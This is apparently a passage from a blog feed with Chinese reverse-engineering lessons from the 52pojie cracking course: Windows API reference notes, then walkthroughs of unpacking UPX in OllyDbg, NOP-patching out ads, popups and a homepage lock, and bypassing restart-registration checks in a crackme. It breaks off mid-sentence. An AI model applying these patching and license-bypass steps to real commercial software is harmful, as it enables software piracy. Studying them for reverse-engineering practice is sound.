●Operation：用于指定要进行的操作。其中“open”操作表示执行由FileName参数指定的程序，或打开由FileName参数指定的文件或文件夹；“print”操作表示打印由FileName参数指定的文件；“explore”操作表示浏览由FileName参数指定的文件夹。当参数设为nil时，表示执行默认操作“open”。 </p><p>　　●FileName：用于指定要打开的文件名、要执行的程序文件名或要浏览的文件夹名。 </p><p>　　●Parameters：若FileName参数是一个可执行程序，则此参数指定命令行参数，否则此参数应为nil或PChar(0)。 </p><p>　　●Directory：用于指定默认目录。 </p><p>　　●ShowCmd：若FileName参数是一个可执行程序，则此参数指定程序窗口的初始显示方式，否则此参数应设置为0。 </p><p>　　若ShellExecute函数调用成功，则返回值为被执行程序的实例句柄。若返回值小于32，则表示出现错误。 　　</p><blockquote><p>WinExec</p></blockquote><p>运行指定的应用程序。</p><pre><code>UINT WINAPI WinExec（_In_ LPCSTR lpCmdLine，_In_ UINT uCmdShow）;</code></pre><p>参数</p><p>　　●lpCmdLine [in]<br>要执行的应用程序的命令行（文件名加可选参数）。如果lpCmdLine参数中的可执行文件的名称不包含目录路径，则系统将按以下顺序搜索可执行文件：</p><ol><li><p>加载应用程序的目录。</p></li><li><p>当前目录。</p></li><li><p>Windows系统目录。该 GetSystemDirectory函数检索此目录的路径。</p></li><li><p>Windows目录。该GetWindowsDirectory函数检索此目录的路径。</p></li><li><p>PATH环境变量中列出的目录。</p></li></ol><p>　　●uCmdShow [in]<br>显示选项。有关可接受值的列表，请参阅ShowWindow函数的nCmdShow参数 的说明。</p><blockquote><p>CreateProcess</p></blockquote><p>WIN32API函数CreateProcess用来创建一个新的进程和它的主线程，这个新进程运行指定的可执行文件。</p><pre><code>BOOL WINAPI CreateProcess（  _In_opt_ LPCTSTR lpApplicationName，  _Inout_opt_ LPTSTR lpCommandLine，  _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes，  _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes，  _In_ BOOL bInheritHandles，  _In_ DWORD dwCreationFlags，  _In_opt_ LPVOID lpEnvironment，  _In_opt_ LPCTSTR lpCurrentDirectory，  _In_ LPSTARTUPINFO lpStartupInfo，  _Out_ LPPROCESS_INFORMATION lpProcessInformation）;</code></pre><p>第 1 个参数 lpApplicationName 是输入参数，指向启动进程的 exe 文件。</p><p>第 2 个参数 lpCommandLine 是输入参数，是启动进程的命令行中的参数。</p><p>当这两个参数都不为 NULL 时，第 1 个参数指定要启动的进程 exe 文件(不带参数)，第 2 个参数指定启动进程所需参数。第 1 个参数也可以为 NULL，此时第 2 个参数就不能为 NULL，在 lpCommandLine 需要指定出要启动的程序名以及所接参数，彼此间以空格隔开，其中第 1 个参数即是程序名。</p><p>第 3 个参数 lpProcessAttributes 是输入参数，指向 SECURITY_ATTRIBUTES 结构变量，是进程的安全属性，可以为 NULL 则使用默认的安全属性。</p><p>第 4 个参数 lpThreadAttributes 是输入参数，同第 3 个参数一样，指向 SECURITY_ATTRIBUTES 结构变量。</p><p>第 5个参数 bInheritHandles 是输入参数，表示新进程是否从调用进程处继承了句柄。如果参数的值为 TRUE，调用进程中的每一个可继承的打开句柄都将被子进程继承。被继承的句柄与原进程拥有完全相同的值和访问权限；如果设为 FALSE，那么不继承。</p><p>第 6 个参数 dwCreationFlags 是输入参数，表示进程的创建标志以及优先级控制。如 ：CREATE_NEW_CONSOLE 会使新建的控制台程序拥有一个新的控制台；DEBUG_PROCESS 调用进程将被当作一个调试程序，并且新进程会被当作被调试的进程。系统把被调试程序发生的所有调试事件通知给调试器。</p><p>第 7 个参数 lpEnvironment 是输入参数，指向新进程的环境变量块，如果设置为 NULL，那么使用父进程的环境变量。</p><p>第 8 个参数 lpCurrentDirectory 是输入参数，指定创建后新进程的当前目录，如果设置为 NULL，那么就在父进程所在的当前目录。</p><p>第 9 个参数 lpStartupInfo 是输入参数，指向一个 STARTUPINFO 结构，该结构里可以设定启动信息，可以设置为 NULL 。</p><p>第 10 个参数 lpProcessInformation 是输出参数，指向一个 PROCESS_INFORMATION 结构，返回被创建进程的信息。</p><p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx" target="_blank" rel="noopener">CreateProcess函数参数</a></p><blockquote><p>CreateThread</p></blockquote><p>CreateThread是一种微软在Windows API中提供了建立新的线程的函数，该函数在主线程的基础上创建一个新线程。线程终止运行后，线程对象仍然在系统中，必须通过CloseHandle函数来关闭该线程对象。</p><p>需要调用到CRT库时，不要用CreateThread 创建线程、并用CloseHandle来关闭这个线程，而应该用_beginthread来创建线程，_endthread来销毁线程。因为没有对子线程为CRT库分配堆，会导致低内存错误而崩溃。</p><p>CreateThread 不会判断lpStartAddr是数据还是代码，甚至不会判断是否有足够的访问权限。lpStartAddr可以未必是个函数，也可以是类成员，只要将函数指针强制转换，并且不产生栈溢出和没有访问权限的问题就以及类如未定义的指令之类的错误可以顺利执行线程。创建类成员函数的对象时，this指针是调用CreateThread时所处的类对象的指针。在类对象外调用，其this指针将是未知的。</p><p>CreateThread将在主线程的基础上创建一个新线程，大致做如下步骤：</p><p>  1.在内核对象中分配一个线程标识/句柄，可供管理，由CreateThread返回</p><p>  2.把线程退出码置为STILL_ACTIVE，把线程挂起计数置1</p><p>  3.分配context结构</p><p>  4.分配两页的物理存储以准备栈，保护页设置为PAGE_READWRITE，第2页设为PAGE_GUARD</p><p>  5.lpStartAddr和lpvThread值被放在栈顶，使它们成为传送给StartOfThread的参数</p><p>  6.把context结构的栈指针指向栈顶（第5步）指令指针指向startOfThread函数</p><pre><code>MSDN中CreateThread原型：HANDLE CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,//SDSIZE_T dwStackSize,//initialstacksizeLPTHREAD_START_ROUTINE lpStartAddress,//threadfunctionLPVOID lpParameter,//threadargumentDWORD dwCreationFlags,//creationoptionLPDWORD lpThreadId//threadidentifier)</code></pre><p>参数说明</p><p>lpThreadAttributes：指向SECURITY_ATTRIBUTES型态的结构的指针。在Windows 98中忽略该参数。在Windows NT中，NULL使用默认安全性，不可以被子线程继承，否则需要定义一个结构体将它的bInheritHandle<br>成员初始化为TRUE<br>dwStackSize，设置初始栈的大小，以字节为单位，如果为0，那么默认将使用与调用该函数的线程相同的栈空间大小。任何情况下，Windows根据需要动态延长堆栈的大小。</p><p>lpStartAddress，指向线程函数的指针，形式：@函数名，函数名称没有限制，但是必须以下列形式声明：</p><p>DWORD WINAPI 函数名 (LPVOID lpParam) ，格式不正确将无法调用成功。</p><p>//也可以直接调用void类型</p><p>//但lpStartAddress要这样通过LPTHREAD_START_ROUTINE转换如：<br>(LPTHREAD_START_ROUTINE)MyVoid<br>//然后在线程声明为：</p><pre><code>void MyVoid(){return;}</code></pre><p>lpParameter：向线程函数传递的参数，是一个指向结构的指针，不需传递参数时，为NULL。</p><p>dwCreationFlags ：线程标志,可取值如下<br> （1）CREATE_SUSPENDED(0x00000004)：创建一个挂起的线程，<br> （2）0：表示创建后立即激活。<br> （3）STACK_SIZE_PARAM_IS_A_RESERVATION(0x00010000)：dwStackSize参数指定初始的保留堆栈 的大小，否则,dwStackSize指定提交的大小。该标记值在Windows 2000/NT and Windows Me/98/95上不支持。</p><p>lpThreadId:保存新线程的id。</p><p>返回值：函数成功，返回线程句柄；函数失败返回false。若不想返回线程ID,设置值为NULL。</p><p>函数说明：<br>创建一个线程。</p><p>语法：</p><pre><code>hThread = CreateThread (&amp;security_attributes, dwStackSize, ThreadProc,pParam, dwFlags, &amp;idThread) ;</code></pre><p>一般并不推荐使用 CreateThread函数，而推荐使用RTL库里的System单元中定义的 BeginThread函数，因为这除了能创建一个线程和一个入口函数以外，还增加了几项保护措施。</p><p>在MFC程序中，应该调用AfxBeginThread函数，在Visual C++程序中应调用_beginthreadex函数。</p><blockquote><p>RegCreateKeyEx</p></blockquote><p>用于创建指定的注册键。</p><pre><code>LONG WINAPI RegCreateKeyEx(_in HKEY hKey,_in LPCTSTR lpSubKey,DWORD Reserved,_in LPTSTR lpClass,_in DWORD dwOptions,_in REGSAM samDesired,_in LPSECURITY_ATTRIBUTES lpSecurityAttributes,_out PHKEY phkResult,_out LPDWORD lpdwDisposition);</code></pre><p>参数 类型及说明</p><p>hKey Long，一个打开项的句柄，或者一个标准项名</p><p>lpSubKey String，欲创建的新子项的名字</p><p>Reserved Long，设为零</p><p>lpClass String，项的类名</p><p>dwOptions Long，下述常数为零：REG_OPTION_VOL<br>ATILE——这个项不正式保存下来，系统重新启动后会消失</p><p>samDesired Long，带有前缀KEY_??的一个或多个常数。它们组合起来描述了允许对这个项进行哪些操作</p><p>lpSecurityAttributes SECURITY_ATTRIBUTES，对这个项的安全特性进行描述的一个结构（用ByVal As Long传递空值）。不适用于windows 95</p><p>phkResult Long，指定用于装载新子项句柄的一个<br>变量</p><p>lpdwDisposition Long，用于装载下列某个常数的一个变量：</p><p>REG_CREATED_NEW_KEY——新建的一个子项</p><p>REG_OPENED_EXISTING_KEY——打开一个现有的项</p><blockquote><p>RegOpenKeyEx</p></blockquote><p>用于打开一个指定的注册表键。</p><pre><code>LONG RegOpenKeyEx(HKEY hKey, // 需要打开的主键的名称LPCTSTR lpSubKey, //需要打开的子键的名称DWORD ulOptions, // 保留，设为0REGSAM samDesired, // 安全访问标记，也就是权限PHKEY phkResult // 得到的将要打开键的句柄);</code></pre><p>hKey</p><p>[输入] 当前打开或者以下预定义的键。</p><pre><code>HKEY_CLASSES_ROOTHKEY_CURRENT_USERHKEY_LOCAL_MACHINE HKEY_USERSHKEY_CURRENT_CONFIGWindows NT/2000/XP: HKEY_PERFORMANCE_DATAWindows 95/98/Me: HKEY_DYN_DATA</code></pre><p>lpSubKey</p><p>[输入] 指向一个非中断字符串包含将要打开键的名称。如果参数设置为NULL 或者指向一个空字符串，过程将打开一个新的句柄由hKey参数确定的值。这种情况下，过程不会关闭先前已经打开的句柄。</p><p>ulOptions </p><p>保留，必须设置为 0</p><p>samDesired</p><p>[输入] 对指定键希望得到的访问权限的访问标记。 这个参数可以使下列值的联合。<br>值 Meaning</p><p>备注</p><p>不像 RegCreateKeyEx 函数，当指定键不存在 RegOpenKeyEx函数不创建新键。</p><blockquote><p>RegDeleteKeyEx</p></blockquote><p>从指定的特定于平台的注册表视图中删除子项及其值。请注意，键名不区分大小写。</p><p>要将子项作为事务操作删除，请调用RegDeleteKeyTransacted函数。</p><pre><code>LONG WINAPI RegDeleteKeyEx（_In_ HKEY hKey，_In_ LPCTSTR lpSubKey，_In_ REGSAM samDesired，_Reserved_ DWORD保留 ）;</code></pre><p>RegDeleteKeyEx函数<br>从指定的特定于平台的注册表视图中删除子项及其值。请注意，键名不区分大小写。</p><p>要将子项作为事务操作删除，请调用RegDeleteKeyTransacted函数。</p><p>句法<br>C ++</p><p>LONG WINAPI RegDeleteKeyEx（<br>  <em>In</em> HKEY hKey，<br>  <em>In</em> LPCTSTR lpSubKey，<br>  <em>In</em> REGSAM samDesired，<br>  <em>Reserved</em> DWORD保留<br>）;</p><p>参数</p><p>hKey[输入]</p><p>一个打开注册表项的句柄。该密钥的访问权限不影响删除操作。有关访问权限的更多信息，请参阅 注册表项安全和访问权限。</p><p>该句柄由RegCreateKeyEx或 RegOpenKeyEx函数返回 ，也可以是以下 预定义键之一：</p><pre><code>HKEY_CLASSES_ROOTHKEY_CURRENT_CONFIGHKEY_CURRENT_USERHKEY_LOCAL_MACHINEHKEY_USERS</code></pre><p>lpSubKey [in]</p><p>要删除的密钥的名称。该密钥必须是由hKey参数的值指定的密钥的子密钥。</p><p>该函数用DELETE访问权限打开子项。</p><p>密钥名称不区分大小写。</p><p>该参数的值不能为NULL。</p><p>samDesired [in]</p><p>访问掩码指定了注册表的特定于平台的视图。</p><h2 id="破解实例"><a href="#破解实例" class="headerlink" title="破解实例"></a>破解实例</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><a href="https://i.loli.net/2018/01/08/5a5368a947d48.png" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/01/08/5a5368a947d48.png" class="lazyload"></a></p><p>程序共三个弹窗和一个主页锁定</p><blockquote><p>脱壳</p></blockquote><p>PEID查壳为UPX</p><p>od打开<br><a href="https://i.loli.net/2018/07/14/5b49f4352ea41.jpg" data-fancybox="group" data-caption="1" class="fancybox"><img alt="1" title="1" data-src="https://i.loli.net/2018/07/14/5b49f4352ea41.jpg" class="lazyload"></a></p><p><strong>UPX的特殊方法</strong><br>ctrl+B搜索字符串，输入多个0，查找</p><p><a href="https://i.loli.net/2018/07/14/5b49f44e0a2e9.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f44e0a2e9.jpg" class="lazyload"></a><br>就可快速查找到大跳转位置，jmp下断点，F8即可到达OEP</p><p><strong>ESP定律法</strong></p><p>F8单步运行一次<br><a href="https://i.loli.net/2018/07/14/5b49f44e2cce7.jpg" data-fancybox="group" data-caption="http://p29uh0ff3l9B.png" class="fancybox"><img alt="http://p29uh0ff3l9B.png" title="http://p29uh0ff3l9B.png" data-src="https://i.loli.net/2018/07/14/5b49f44e2cce7.jpg" class="lazyload"></a></p><p>可以看到只有ESP为红色，记下此时ESP寄存器中的值0045f804</p><p>在下面命令行输入dd 0045f804（或hr esp），回车<br><a href="https://i.loli.net/2018/07/14/5b49f44e517b0.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f44e517b0.jpg" class="lazyload"></a><br>选中要下断点的0045f804那行，依次选择断点 -&gt; 硬件访问 -&gt; Word</p><p>在菜单栏调试（D）下的硬件断点（H）下选项下可以看到我们设置的硬件断点<br><a href="https://i.loli.net/2018/07/14/5b49f44e65b7f.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f44e65b7f.jpg" class="lazyload"></a></p><p>按下F9运行程序，运行到程序停止<br><a href="https://i.loli.net/2018/07/14/5b49f44e8ae18.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f44e8ae18.jpg" class="lazyload"></a></p><p>删除前面下的硬件断点，选择调试（D）下的硬件断点（H），弹出如下对话框，点击删除1按钮删除前面下的硬件断点<a href="https://i.loli.net/2018/07/14/5b49f44e9de3a.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f44e9de3a.jpg" class="lazyload"></a></p><p>下面的jmp跳转的数值非常大，基本判定将要到达OEP。在jmp处F2下断点，F9运行到这一步，F8单步运行一次<br><a href="https://i.loli.net/2018/07/14/5b49f44ec0a6f.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f44ec0a6f.jpg" class="lazyload"></a><br>这里就是程序真正的入口点，非常明显是VS2008/2010编译的</p><p>复制call这行的地址，可用快捷键ctrl+x</p><p>打开scylla，<br><a href="https://i.loli.net/2018/07/14/5b49f44ee2a29.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f44ee2a29.jpg" class="lazyload"></a></p><p>选择要调试的进程，将刚刚复制的地址填进OEP框，点击  自动查找IAT – 获取输入表</p><p>点击 转储文件–修复转储文件<br>得到名为dump和dump_SCY的文件</p><p>SCY的就是已经脱壳的<br><a href="https://i.loli.net/2018/07/14/5b49f44f00e1a.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f44f00e1a.jpg" class="lazyload"></a></p><p><strong>注意！！！</strong></p><p>win7及以上系统具有ASLR保护功能</p><p>ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。据研究表明ASLR可以有效的降低缓冲区溢出攻击的成功率，如今Linux、FreeBSD、Windows等主流操作系统都已采用了该技术。</p><p>需要在dump并修复后使用ASLR disabler工具关闭ASLR功能，否则会出现<a href="https://i.loli.net/2018/07/14/5b49f44f1461d.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f44f1461d.jpg" class="lazyload"></a></p><blockquote><p>去除主页锁定</p></blockquote><p>搜索字符串，找到如下<br><a href="https://i.loli.net/2018/07/14/5b49f4735cd9f.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f4735cd9f.jpg" class="lazyload"></a></p><pre><code>SOFTWARE\microsoft\Internet Explorer\Main</code></pre><p>是对注册表的修改，这里也就是通过修改注册表来修改主页</p><p>双击跟随<a href="https://i.loli.net/2018/07/14/5b49f4787a660.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f4787a660.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/14/5b49f4cf9a4aa.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f4cf9a4aa.jpg" class="lazyload"></a><br>这里因为脱壳不够完美，OD没有分析，需要PE地址修正</p><p>找到段尾，有retn，为不让它修改主页，我们可以把段首也改为retn，也就是改为与段尾相同。（retn法）</p><p>保存到可执行文件</p><blockquote><p>去内部网页</p></blockquote><p>可使用Restorator修改窗口为不可视</p><p>或</p><p>OD内找到API</p><pre><code>CreateWindowExA/W</code></pre><p>F2断点<br><a href="https://i.loli.net/2018/07/14/5b49f4cfbf476.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f4cfbf476.jpg" class="lazyload"></a></p><p>把   <strong>每一处</strong>    宽和高都改为0即可</p><blockquote><p>右下角弹窗去除</p></blockquote><p>使用ProcExp或Procmon来查找窗口进程<br><a href="https://i.loli.net/2018/07/14/5b49f4cfe4002.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f4cfe4002.jpg" class="lazyload"></a></p><p>窗口创建也可用DialogBox</p><p>ctrl+G搜索</p><pre><code>DialogBoxParamA/W</code></pre><p>下断点</p><p>断下后nop即可</p><blockquote><p>相关工具</p></blockquote><p>procmon和API monitor可检测程序所有行为</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><a href="https://i.loli.net/2018/07/14/5b49f4d0190a6.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f4d0190a6.jpg" class="lazyload"></a></p><p>程序打开后有一个弹窗，软件下面有广告链接</p><p>PEID查壳发现没加壳，VC++6.0编译</p><p>用OD打开，搜索字符串http<br><a href="https://i.loli.net/2018/07/14/5b49f4a750429.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f4a750429.jpg" class="lazyload"></a></p><p>发现广告网址2345，搜索2345,发现<br><a href="https://i.loli.net/2018/07/14/5b49f4a775191.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f4a775191.jpg" class="lazyload"></a></p><p>点击跟随<br><a href="https://i.loli.net/2018/07/14/5b49f4a79a50a.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f4a79a50a.jpg" class="lazyload"></a></p><p>发现一个控制台和一个消息框API，把函数和参数（相应push和call）选中，nop填充复制到可执行文件。</p><p>打开仍有广告，于是继续</p><p>ctrl+G分别搜索下面的API，并下断点<br><a href="https://i.loli.net/2018/07/14/5b49f397ce204.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f397ce204.jpg" class="lazyload"></a></p><p>F9运行将断下的API全部nop</p><p>打开Restorator，载入文件，打开对话框<br><a href="https://i.loli.net/2018/07/14/5b49f397f28c9.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f397f28c9.jpg" class="lazyload"></a></p><p>点上面的编辑，<br><a href="https://i.loli.net/2018/07/14/5b49f39822033.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f39822033.jpg" class="lazyload"></a><br>选择相应按钮进行编辑即可。</p><p>至此软件去广告完毕。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;吾爱破解培训第二课：实战去广告、弹窗及主页锁定&quot;&gt;&lt;a href=&quot;#吾爱破解培训第二课：实战去广告、弹窗及主页锁定&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="吾爱破解培训" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="脱壳，去广告及弹窗" scheme="https://kabeor.github.io/tags/%E8%84%B1%E5%A3%B3%EF%BC%8C%E5%8E%BB%E5%B9%BF%E5%91%8A%E5%8F%8A%E5%BC%B9%E7%AA%97/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解培训第五课：反击作者的挑衅--实战解除程序重启验证</title>
    <link href="https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%BA%94%E8%AF%BE%EF%BC%9A%E5%8F%8D%E5%87%BB%E4%BD%9C%E8%80%85%E7%9A%84%E6%8C%91%E8%A1%85--%E5%AE%9E%E6%88%98%E8%A7%A3%E9%99%A4%E7%A8%8B%E5%BA%8F%E9%87%8D%E5%90%AF%E9%AA%8C%E8%AF%81/"/>
    <id>https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%BA%94%E8%AF%BE%EF%BC%9A%E5%8F%8D%E5%87%BB%E4%BD%9C%E8%80%85%E7%9A%84%E6%8C%91%E8%A1%85--%E5%AE%9E%E6%88%98%E8%A7%A3%E9%99%A4%E7%A8%8B%E5%BA%8F%E9%87%8D%E5%90%AF%E9%AA%8C%E8%AF%81/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:36:50.444Z</updated>
    
    <content type="html"><![CDATA[<h1 id="吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证"><a href="#吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证" class="headerlink" title="吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证"></a>吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证</h1><blockquote><p>如何在OD中找到程序调用的一个API的所有位置</p></blockquote><p>OD字符串插件的使用<br>Ctrl+F搜索字符串</p><blockquote><p>熟悉OD如何下断点</p></blockquote><p>Ctrl+G:直接断API</p><p>Ctrl+N:输入表断API      </p><p>ctrl+N显示API窗口，直接搜索API，右键，查找函数参考，可给所有位置下断点</p><p>利用插件apibreak或api断点设置工具</p><blockquote><p>熟悉procmon的使用</p></blockquote><p>可以监控文件，注册表，网络，进线程信息</p><p>排除进程:ExClude</p><p>查看指定进程:Include</p><blockquote><p>熟悉文件操作API的使用</p></blockquote><pre><code>CreateFileA/W:创建文件ReadFile:读取文件WriteFile:写入文件CloseHandle:关闭句柄读取文件:CreateFile-&gt;ReadFile-&gt;CloseHandle写入文件:CreateFile-&gt;WriteFile-&gt;CloseHandle</code></pre><blockquote><p>熟悉注册表操作API的使用</p></blockquote><pre><code>创建注册表Key:RegCreateKey打开注册表Key:RegOpenKey查询注册表键值:RegQueryValue(Ex)写入注册表键值:RegSetValueEx</code></pre><h3 id="什么是重启验证"><a href="#什么是重启验证" class="headerlink" title="什么是重启验证"></a>什么是重启验证</h3><p>重启验证顾名思义就是在程序启动时验证注册信息。 </p><h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><p>基本的执行流程:注册信息输入–&gt;程序重启–&gt;执行验证机制–&gt;正常执行</p><p>扩展的执行流程:注册信息输入–&gt;执行部分验证机制/执行假验证机制–&gt;程序重启–&gt;执行真验证机制–&gt;正常执行</p><p>对于有经验的作者来说,可以在注册信息输入和程序重启之间加入假的验证机制,假的验证机制一般比较简单,比如说只是当单纯的明码比较,当我们输入这个假的注册码的,程序一般会提示注册成功,此时程序就会知道我们是逆向者,在程序重启时就会假装注册成功,在执行程序功能时就会报错或是无反应,这就是所谓的暗桩。</p><h3 id="重启验证的类型"><a href="#重启验证的类型" class="headerlink" title="重启验证的类型"></a>重启验证的类型</h3><p>重启验证根据写入信息位置的不同一般分两类,一类是将注册信息写入文件中,一类是将注册信息写入注册表中。</p><h3 id="定位关键代码"><a href="#定位关键代码" class="headerlink" title="定位关键代码"></a>定位关键代码</h3><p>1.字符串定位</p><p>通过OD字符串插件扫描敏感字符串,一般出现的文件路径或是注册表路径都可能是验证信息的保存位置</p><p>2.监控工具定位</p><p>通过procmon等监控工具监控注册信息的写入位置</p><p>3.API定位</p><p>通过定位CreateFile,RegCreateKey等API来获取注册信息的写入位置</p><h3 id="Demo演示"><a href="#Demo演示" class="headerlink" title="Demo演示"></a>Demo演示</h3><blockquote><p>重启验证1:写入信息进txt:             </p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JXU2MjExJXU2</span><br></pre></td></tr></table></figure></div><p>CreateFile-&gt;WriteFile-&gt;ReadFile-&gt;比较算法</p><blockquote><p>重启验证2:写入信息进ini</p></blockquote><p>WritePrivateProfileStringA:写入配置信息</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0012F530   00544638  |Section &#x3D; &quot;验证&quot;</span><br><span class="line">0012F534   00544634  |Key &#x3D; &quot;Key&quot;</span><br><span class="line">0012F538   001C9578  |String &#x3D; &quot;987654321&quot;</span><br><span class="line">0012F53C   001D7F70  \FileName &#x3D; &quot;C:\Users\Administrator\Desktop\52Pojie.ini&quot;</span><br></pre></td></tr></table></figure></div><p>GetPrivateProfileStringA:读取配置信息</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NjJGJXU3NTI</span><br></pre></td></tr></table></figure></div><blockquote><p>重启验证3:写入信息进注册表</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4JXU2MjM3</span><br></pre></td></tr></table></figure></div><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><a href="https://i.loli.net/2018/07/14/5b49f5eea5ecd.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5eea5ecd.jpg" class="lazyload"></a></p><blockquote><p>爆破方法</p></blockquote><p>OD打开，搜索字符串找到<br><a href="https://i.loli.net/2018/07/14/5b49f5eeb9313.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5eeb9313.jpg" class="lazyload"></a></p><p>跟随字符串    </p><pre><code>恭喜你发现彩蛋,这是一个解迷的彩蛋,请根据提示得到正解的注册码</code></pre><p><a href="https://i.loli.net/2018/07/14/5b49f5eecdaef.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5eecdaef.jpg" class="lazyload"></a><br>只要nop掉jnz就可以强制跳转，修改后出现彩蛋<br><a href="https://i.loli.net/2018/07/14/5b49f5eee03fc.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5eee03fc.jpg" class="lazyload"></a></p><blockquote><p>追码方法</p></blockquote><ol><li>52Pojie.txt：ITN3UXJGJ</li></ol><p>Ctrl+N 找ReadFile，查找输入函数参考，找到比较注册码的算法。<br>  <a href="https://i.loli.net/2018/07/14/5b49f5eef2418.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5eef2418.jpg" class="lazyload"></a></p><ol start="2"><li>52Pojie.ini：jN2UXJxEjM2UXJ</li></ol><p>Ctrl+N 找GetPrivateProfileString，查找输入函数参考，找到比较注册码的算法。</p><p>真实注册码（密）：3A 1E 02 25 28 1A 48 15 3A 1D 02 25 28 1A</p><p>加0x30还原为真实注册码（明）：6A 4E 32 55 58 4A 78 45 6A 4D 